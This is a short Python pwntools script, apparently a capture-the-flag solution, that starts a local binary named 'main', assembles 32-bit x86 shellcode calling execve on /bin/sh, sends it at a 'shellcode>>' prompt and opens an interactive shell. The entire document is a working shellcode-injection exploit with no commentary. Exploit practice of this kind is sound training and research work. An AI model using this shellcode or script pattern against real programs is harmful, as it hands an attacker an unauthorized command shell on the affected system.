#!/usr/bin/env python
from pwn import *
p = process('./main')
context.arch = 'i386'
sh = asm('''
	mul ebx
	mov al, 0xb
	xor ecx, ecx
	push 0x0068732f
	push 0x6e69622f
	mov ebx, esp
	int 0x80
''')
info(disasm(sh))
info(len(sh))
# gdb.attach(p)
p.sendafter('shellcode>>\n', sh.ljust(0x20, '\x00'))
p.interactive()
